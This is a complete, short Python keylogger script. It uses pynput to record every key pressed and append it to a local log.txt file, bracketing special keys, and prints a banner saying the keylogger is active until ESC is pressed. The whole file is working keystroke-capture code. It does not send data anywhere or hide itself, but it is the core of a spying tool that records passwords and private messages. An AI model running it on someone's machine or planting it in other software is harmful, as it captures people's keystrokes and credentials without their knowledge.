import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []


def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            if str(key).find('Key.space') != -1:
                f.write(' ')
            elif str(key).find('Key') != -1:
                f.write('\n'+'['+str(key).replace('Key.', '')+']'+'\n')
            elif str(key).find('Key') == -1:
                f.write(str(key).replace("'", ""))


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # print("{0}".format(keys))

    if str(key).find('Key') >= 0:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


print("[*] Keylogger active. Press ESC to stop...")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
